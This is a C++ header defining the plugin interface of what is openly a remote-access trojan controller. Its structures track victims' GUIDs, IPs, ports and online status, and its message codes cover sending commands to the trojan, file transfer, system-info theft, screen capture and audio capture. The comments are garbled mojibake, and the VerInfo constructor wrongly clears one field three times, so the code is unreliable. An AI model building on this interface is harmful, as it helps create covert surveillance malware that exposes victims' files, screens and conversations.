// IPlugIn.h: interface for the IPlug class.
//
//
// �ͻ��˲���ӿ�
//////////////////////////////////////////////////////////////////////
#ifndef _IPLUG_H
#define _IPLUG_H

#ifdef LIBPLUG_EXPORT
#define LIBPLUG_API __declspec(dllexport)
#else
#define LIBPLUG_API __declspec(dllimport)
#endif

#include <string>

#define WM_SYSTEMTRAY	(WM_USER+1)
#define WM_TRAY_EXIT	(WM_USER+2)

#define WM_PLUG_FIRST	(WM_USER+100)	//����Ĳ˵������СID
#define WM_PLUG_LAST	(WM_USER+999)	//����Ĳ˵�������ID
#define WM_PLUG_EACH	10				//ÿ�����֧�ֵĲ˵������

//////////////////////////////////////////////////////////////////////////
//
// �汾��Ϣ�����ݽṹ
//
//////////////////////////////////////////////////////////////////////////
class LIBPLUG_API VerInfo
{
public:
	// �������
	char		sName[MAX_PATH];
	// �������
	char		sDesc[MAX_PATH];
	// �������
	char		sAuthor[MAX_PATH];
	// ����汾
	UINT		uReserved;
public:
	VerInfo()
	{
		memset(sName,0,sizeof(sName));
		memset(sName,0,sizeof(sDesc));
		memset(sName,0,sizeof(sAuthor));
		uReserved = 0;
	}
};

//��׼�����ݽṹ
typedef struct TrojanInfo
{
	void*	s;						//���ӻỰ
	char	guid[40];				//ľ��GUID
	bool	bOnlineFlag;			//Ŀ������߱�־��true����
	char	dllInfo[1024];			//�����Ϣ
	int		dllCnt;					//ľ������Ŀ
	char	trojanip[16];			//IP
	unsigned short port;			//ľ��˿�
	unsigned short ostype;			//ľ��OS����
	time_t	timestamp;				//������ʼʱ��
	int		iData;					//���ͽṹ�ڵ�ֵ
}STANDARDDATA;

//////////////////////////////////////////////////////////////////////////
//
// ��������ť�����ݽṹ
//
//////////////////////////////////////////////////////////////////////////
class LIBPLUG_API ToolBarData
{
public:
	// ����
	char sName[MAX_PATH];
	// ����
	TCHAR sDesc[MAX_PATH];
	// ��ʾ
	char sTip[MAX_PATH];
	// ID
	UINT  uId;
	// ͼ������
	UINT  uIconId;
	//�Ƿ�����ͼ����
	BOOL  bGroup;
	ToolBarData(){
		memset(sName,0,sizeof(sName));
		memset(sTip,0,sizeof(sTip));
		memset(sDesc,0,sizeof(sDesc));
		bGroup = FALSE;
		uId = 0;
		uIconId = 0;
	}
};

//////////////////////////////////////////////////////////////////////////
//
// ���ڵ�ͣ��λ��
// ö������
//
//
//////////////////////////////////////////////////////////////////////////
enum DockPaneDirection
{
	DockLeft,
	DockRight,
	DockTop,
	DockBottom
};

//////////////////////////////////////////////////////////////////////////
//
// ͣ�����ڵ����ݽṹ
//
//
//////////////////////////////////////////////////////////////////////////
class LIBPLUG_API DockPane
{
public:
	// ��������
	char	sName[MAX_PATH];
	// ���ھ��
	CWnd*	pWnd;
	// ͣ��λ��
	DockPaneDirection direct;
	// ���ڴ�С
	CRect	rect;
	// ����ͼ������
	UINT	uIconId;
	// ����id
	UINT	uId;
	DockPane(){
		memset(sName,0,sizeof(sName));
		pWnd = NULL;
		direct = DockLeft;
		uIconId = 0;
		uId = 0;
		rect.SetRect(0,0,200,150);
	}
};
class SEU_QQwry;
//////////////////////////////////////////////////////////////////////////
//
// ƽ̨�Ľӿ�
//
//////////////////////////////////////////////////////////////////////////
class LIBPLUG_API ISite
{
public:

	// **************************
	// ����ģ��
	static void AddDocTemplate(CMultiDocTemplate*);
	// �õ�MainFrame
	static CWnd* GetMainFrameWnd();

	// **************************
	// �����򼤻��´���
	static CFrameWnd* CreateFrameWnd(CMultiDocTemplate*, CRuntimeClass*, const char*);
	
	// �Զ��ж��Ƿ񼤻�ͣ������
	static void ShowDockPane(UINT);
	
	// �򿪻�ر�
	static void ShowDockPane(UINT,BOOL);

	//д��־���������
	static void WriteLog(const char* fmt, ...);

	// **************************
	// ����һ�������������ţ�����1������2
	static BOOL	Service(UINT,WPARAM,LPARAM);
	// ����һ����Ϣ֪ͨ
	static void	Notify(UINT,WPARAM,LPARAM);

	//���������ľ������
	static int SendCmd(unsigned short cmd, void* s, char* body = NULL, int n = 0);

	//��ǰѡ�е�ľ��
	static struct TrojanInfo* GetSelectedTarget();
	
	//���õ�ǰľ��
	static void  SetCurrentTarget(const struct TrojanInfo* info);

	//��ȡIP��ַ�Ͷ˿�
	static CString GetIPAddrPort(const char* ip, int port); 

	//��ȡIP��ʵ�������ַ
	static CString GetRealAddr(const struct TrojanInfo* info); 


	//����״̬������Ϣ
	//0:��������
	//1:��ǰ���м����û�
	//2:��ǰѡ���ĸ��û�
	//3:���紫���ٶ�
	static void SetStatus(int nIndex, const char* fmt, ...);

	/**���½ṹ�ͺ���Ϊ�ϴ��������ļ���ʾ���ȶԻ���ʹ��**/
	enum{CREATE_DLG, INIT_SRC, INIT_DST, SET_NAME, SET_DIR,SET_SIZE, 
		SET_PROGRESS, SET_SPEED, SET_TIME, DESTROY_DLG};
	
	struct StructProgressNotify
	{
		int id;
		CWnd* dlg;
		UINT_PTR data;
	};

	//������ܷ�����Ϣ
	static void OnNotifyProgress(WPARAM,LPARAM);
	//�������ȶԻ���
	static CWnd* CreateProgressDlg(int isUpOrDown);
	//���ٽ��ȶԻ���
	static void DestoryDlg(CWnd* dlg);
	//����ԴĿ¼
	static void SetSource(CWnd* dlg,const char* src);
	//����Ŀ��Ŀ¼
	static void SetDestination(CWnd* dlg,const char* dst);
	//���ô����ļ�
	static void SetTransFile(CWnd* dlg, const char* name);
	//���ô��͵���Ŀ¼
	static void SetSubDir(CWnd* dlg,const char* dir);
	//�����ļ���С
	static void SetSize(CWnd* dlg, __int64 nowSize);
	//�����Ѿ����͵��ļ���С
	static void SetProgress(CWnd* dlg, __int64 totalSize);
	//���ô����ٶ�
	static void SetSpeed(CWnd* dlg, __int64 speed, int isTime = 0);

private:
	static struct TrojanInfo m_current;
	static bool m_bIsQQwryExist;
	static SEU_QQwry* m_QQwry;
	
	friend class PluginApp;
};

//////////////////////////////////////////////////////////////////////////
//
// ƽ̨����Ľӿ�
//
//////////////////////////////////////////////////////////////////////////
class LIBPLUG_API IService
{
public:
	// **************************
	// �����ʼ��
	virtual BOOL	OnInitalize() = 0;
	// ж�ز��
	virtual BOOL	OnUninitalize() = 0;
	
	// ���յ�һ�������������ţ�����1������2
	virtual BOOL	OnService(UINT,WPARAM,LPARAM) = 0;

	// **************************
	// �õ��汾��Ϣ
	inline VerInfo* GetVerInfo() {return &m_srInfo;}

protected:
	VerInfo m_srInfo;
};

//////////////////////////////////////////////////////////////////////////
//
// ����ӿ�
//
//////////////////////////////////////////////////////////////////////////
class LIBPLUG_API IPlugIn  
{
public :

	// �����ʼ��
	virtual BOOL	OnInitalize() = 0;
	// ж�ز��
	virtual BOOL	OnUninitalize() = 0;
	
	// ************************************
	// �����ĵ�ģ��
	virtual void OnCreateDocTemplate() = 0;

	// ������ܲ˵�
	virtual void OnCreateFrameMenu(CMenu* pMainMenu) = 0;

	// ������ܹ�����
	virtual	void OnCreateFrameToolBar(ToolBarData*,UINT& count) = 0;

	// ����ͣ������
	virtual void OnCreateDockPane(DockPane*, UINT& count) = 0;
	// ************************************

	
	// ************************************
	// ������С/�����Դ��
	inline	void SetMinResId(UINT min){m_min = min;}
	inline	void SetMaxResId(UINT max){m_max = max;}
	inline	UINT GetMinResId(){return m_min;};
	inline	UINT GetMaxResId(){return m_max;};
	inline	bool IsCurrentWorking(){return curruId == m_min + 2;};
	// ************************************

	// �õ��汾��Ϣ
	inline VerInfo*	GetVerInfo() {return &m_plugInfo; }
	// ************************************


	// �˵�������������
	virtual void	OnCommand(UINT resId) = 0;
	virtual void	OnCommandUI(CCmdUI* pCmdUI) = 0;
	// �յ�֪ͨ��֪ͨ�ţ�����1������2
	virtual void	OnNotify(UINT,WPARAM,LPARAM) = 0;

	static int curruId;

protected:
	UINT m_min;
	UINT m_max;
	VerInfo m_plugInfo;
};

//////////////////////////////////////////////////////////////////////////
//
// ����ӿڵĴ�����
//
//////////////////////////////////////////////////////////////////////////
class LIBPLUG_API IServiceProxy  
{
public:
	IServiceProxy(){m_pService = NULL; }
	virtual ~IServiceProxy(){}

	// ���IServiceָ��
	IService* operator ->(){return m_pService;}
	operator const IService*() const{return m_pService;};

	// ��һ���ӿ�
	bool Attach(IService* pService)
	{	
		if (pService){ m_pService = pService; return true; }
		return false;
	}
	
	// ����ӿ�
	IService* Detach()
	{
		IService* pService = m_pService;
		m_pService = NULL;
		return pService;
	}

private:
	IService* m_pService;
};

//////////////////////////////////////////////////////////////////////////
//
// ����ӿڵĴ�����
//
//////////////////////////////////////////////////////////////////////////
class LIBPLUG_API IPlugProxy
{
public:
	IPlugProxy(){m_pPlug = NULL; }
	virtual ~IPlugProxy(){}

	// ��һ���ӿ�
	bool Attach(IPlugIn* pPlugIn)
	{
		if (pPlugIn)
		{
			m_pPlug = pPlugIn;
			return true;
		}
		return false;
	}
	
	// ����ӿ�
	IPlugIn* Detach()
	{
		IPlugIn* pPlugIn = m_pPlug;
		m_pPlug = NULL;
		return pPlugIn;
	}
	
	// ���IPlugInָ��
	IPlugIn* operator->(){return m_pPlug;}
	inline operator const IPlugIn*() const{return m_pPlug;}

	UINT GetFirstIconId(){return m_uIconId;}

	void SetFirstIconId(UINT id){m_uIconId = id;}

	
private:
	IPlugIn*	m_pPlug;
	// imgListͼ������
	UINT	m_uIconId;
};

// ��̬���ӿ��װ�࣬������Ҫ�����ȡdll�ļ�,�õ����,�ͷ�dll�ļ���
class LIBPLUG_API DllWrapper  
{
public:
	DllWrapper();
	virtual ~DllWrapper();

	// ��dll�ļ��е�ͼƬ��Դ����imageList
	UINT GetImage(CImageList&, UINT id);
	
	// �ͷ�dll�ļ�
	bool FreeLibrary();

	// ����dll�ļ�
	bool LoadLibrary(const char* path, const char* file);

	// �õ��ļ���·��
	const char* GetFilePath()const;

	// �õ��ļ���
	const char*	GetFileName()const;	

	// �õ�dllʵ��
	HINSTANCE	GetInstance()const;
	
	// �õ�����ӿ�
	IPlugProxy&	GetPlugIn();
	
	// �õ�ƽ̨�ӿ�
	IServiceProxy&	GetService();

private:
	// ����ӿ�
	IPlugProxy	m_plugProxy;
	
	// ƽ̨����ӿ�
	IServiceProxy	m_serviceProxy;
	
	// ·��
	char			m_strPath[MAX_PATH];
	// �ļ���
	char			m_strFile[MAX_PATH];
	// dll���
	HINSTANCE		m_hInstance;

};

struct control_header;

//�ͻ��˼����߳�������������
struct DispatchData 
{
	void* s;				//���ӻỰ

	union{
		struct  
		{
			char guid[40];			//ľ���GUID
			char trojanip[16];		//ľ���IP
			unsigned short port;	//ľ��Ķ˿�
			unsigned short type;	//ľ�����������
			void* body;				//���ܵ�����
			control_header* header;
		}recvData;

		struct  
		{
			unsigned short cmd;	//������
			void* body;			//���͵�����
			int dataLen;		//���ݳ���
		}sendData;

	};

	 int (*readFunction)(void* s, char* buf, int dataLen, int isCompressed, int bufLen, int flags);	//�����ȡ����
	 int (*WriteFunction)(void* s, char* header, char* buf, int dataLen, int isCompressed);//����д����
};

//*****************************ͨ�ź�***************************/
//
#define		ZCM_BASE				20001

//�û�ѡ��һ��Ŀ���,
//����wp:pSTANDARDDATA�ṹָ��
#define		ZCM_SEL_OBJ				ZCM_BASE+0x01

//����������׼������õ�Ŀ�����Ϣ
//����wp:conn s�Ự���� ����LP STANDARDDATA�ṹ����
#define		ZCM_GET_OBJ				ZCM_BASE+0x02

//����������׼������������ָ���ľ��
#define		ZCM_SEND_MSG			ZCM_BASE+0x03

//��׼��֪ͨ�������ľ��˽��յ�����
#define		ZCM_RECV_MSG			ZCM_BASE+0x04

//֪ͨ��׼�������ľ����
#define		ZCM_UPDATE_TROJAN		ZCM_BASE+0x05

//���������ȡ�������Բ���õ�Ŀ���������Ϣ
#define     ZCM_GET_SYSINFO         ZCM_BASE+0x08

//�յ�keepalive���㲥��Ϣ
#define		ZCM_NEW_ONLINE		ZCM_BASE+0x09

//Ŀ������߷��㲥��Ϣ
#define		ZCM_WM_OFFLINE			ZCM_BASE+0x0A

//�����ļ����͵���Ϣ
#define		ZCM_WM_UPLOAD_DOWNLOAD	ZCM_BASE+0x0B

//�ֻ�����֪ͨ
#define		ZCM_WM_MSG_ONLINE		ZCM_BASE+0x0C

//��׼���Ҽ��˵�����
#define		ZCM_WM_R_MENU			ZCM_BASE+0x0D

//��׼��д��־����
#define		ZCM_WM_WRITE_LOG		ZCM_BASE+0x0E

//���������������Ϣ�������Ŀ�������
#define     ZCM_WM_DESCRIPTION      ZCM_BASE+0x0F

//��׼���ṩ�ķ���,����������ṩ����ip�ͼ����˿�
#define		ZCM_WM_LOCAL_NET		ZCM_BASE+0x10

//�������������Ŀ�����������������char lp[MAX_PATH]
#define		ZCM_WM_SEND_DES			ZCM_BASE+0x11

#define		ZCM_DB_SQL				ZCM_BASE+0x12
#define		ZCM_DB_INSERT			ZCM_BASE+0x13
#define		ZCM_DB_UPDATE			ZCM_BASE+0x14
#define		ZCM_DB_DELETE			ZCM_BASE+0x15

#define		ZCM_DB_GET_POOL			ZCM_BASE+0x16

#define		ZCM_PROGRESS			ZCM_BASE+0x17

//������Ļ��ش���
#define		ZCM_WM_SCREEN			ZCM_BASE+0x18

//����������ش���
#define		ZCM_WM_AUDIO			ZCM_BASE+0x19
#endif 